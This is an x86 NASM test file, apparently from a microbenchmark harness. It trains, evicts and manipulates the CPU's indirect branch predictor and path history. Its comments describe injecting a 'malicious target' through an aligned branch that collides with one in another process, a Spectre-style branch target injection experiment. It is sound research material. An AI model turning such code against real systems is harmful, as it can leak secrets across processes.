%include "../../../nops.inc"

%define nthreads 1
%define repeat0  1              ; Number of repetitions of whole test. Default = 8
%define repeat1  100              ; Repeat count for loop around testcode. Default = no loop
%define repeat2  1              ; Repeat count for repeat macro around testcode. Default = 100
%define noptype  2

%macro testinitc 0

    mov rbx, [PSharedMemory]
    mov dword[rbx], 1

    mov rbx, [PSharedMemory2]
    mov dword[rbx], 0

    %rep 10
      mov r11, victim_target
      call start_gadget_0
    %endrep

%endmacro

%macro EVICT_IBP 0
   %rep 10 ; Flush IBP first
        rdrand rdx
        and rdx, 1
        mov qword[UserData], rdx
        SERIALIZE_OPT
        call start_evict_ibp
        xor qword[UserData], 1
        SERIALIZE_OPT
        call start_evict_ibp
    %endrep

%endmacro


%macro testcode 0               ; A multi-line macro executing any piece of test code.
acquire_spinlock_0_0:
    mov   eax, 1
    mov   rbx, [PSharedMemory]
    xchg  eax, dword[rbx]
    test  eax, eax
    jnz   acquire_spinlock_0_0

    ;EVICT_IBP

    %rep 5
        lea r11, [victim_target]
        SERIALIZE_OPT
        call start_test_ibranch
    %endrep

    SERIALIZE_OPT


release_spinlock_1_0:
    SERIALIZE
    mfence
    mov rbx, [PSharedMemory2]
    dec dword[rbx]

    %rep 512
     nop
    %endrep

%endmacro

%macro SERIALIZE_OPT 0
    mfence
    xor eax, eax
    cpuid
%endmacro

%macro SHIFT_PHR 2
    mov rax, %1
    jmp shift_phr_%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr_%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr_%+ %2
%endmacro

%macro SET_PHR 2
    %assign i 0
    %rep %1
        cmp qword[UserData], 1
        je set_phr_eq_%+ %2_%+ i
        %rep 64
         nop
        %endrep
        set_phr_eq_%+ %2_%+ i:
        %rep 64
         nop
        %endrep
        %assign i i+1
    %endrep
%endmacro

%macro SET_PHR_EVEN 1
    cmp rdx, 1
    %rep 50
     nop
    %endrep
    je set_phr_even_%+ %1
    align 1<<6
    set_phr_even_%+ %1:
    %rep 77H
     nop
    %endrep
%endmacro

section .sec_gadget_0 exec
start_gadget_0:
    jmp r11 ; Insert/Fetch malicious_target into IBP
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep

section .sec_gadget_1 exec
start_gadget_1:
    jmp r11 ; Speculatively fetch/insert malicious target
    %rep 512
      nop
    %endrep
   ret

%rep 512
  nop
%endrep

section .sec_test_ibranch exec
start_test_ibranch:
    lea r10, [target_test_0] ; Load target_test_0
    mov qword[UserData+64], r10
    clflush [UserData+64]
    SERIALIZE_OPT

    ; Pad so test_ibranch_pc lands at the same section-relative offset
    ; (0x20) as collision_ibranch_pc in read_process, so the two indirect
    ; branches end up at the same absolute address cross-process.
    times (0x20 - ($ - start_test_ibranch)) nop

test_ibranch_pc:
    jmp qword[UserData+64] ; Speculatively jump to gadget and write malicious_target_0
    %rep 512
     nop
    %endrep
target_test_0:
    %rep 512
     nop
    %endrep
    ret
target_test_1:
    %rep 512
     nop
    %endrep
    ret

section .sec_evict_ibp exec
start_evict_ibp:
    %assign k 2
    %rep 6
        lea r10, [target_evict_0_%+ k]
        lea r9, [target_evict_1_%+ k]
        mov rdx, qword[UserData]
        cmp rdx, 1
        cmovz r10, r9
        SHIFT_PHR 195, k
        SET_PHR 15, k
        SERIALIZE_OPT
        %rep k<<7
         nop
        %endrep
    evict_ibranch_pc_%+ k:
        jmp r10
        %rep 512
         nop
        %endrep
    target_evict_0_%+ k:
        %rep 512
         nop
        %endrep
    target_evict_1_%+ k:
        %rep 512
         nop
        %endrep
    %assign k k+1
    %endrep
    ret

  %rep 512
    nop
  %endrep

section .sec_victim_target exec
victim_target:
    mov r9, [UserData+1024]
    %rep 512
      nop
    %endrep
    ret

%rep 512
  nop
%endrep
